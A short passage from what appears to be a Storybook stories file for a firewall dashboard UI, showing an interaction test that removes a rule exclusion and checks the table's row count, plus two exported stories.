    await userEvent.click(c.getByRole("button", { name: "Remove exclusion 930120 on www.example.com" }));
    await expect(c.getByRole("table", { name: "Exclusions" }).querySelectorAll("tbody tr")).toHaveLength(1);
  },
};

export const Integrations: Story = app("integrations");
export const Settings: Story = app("settings");
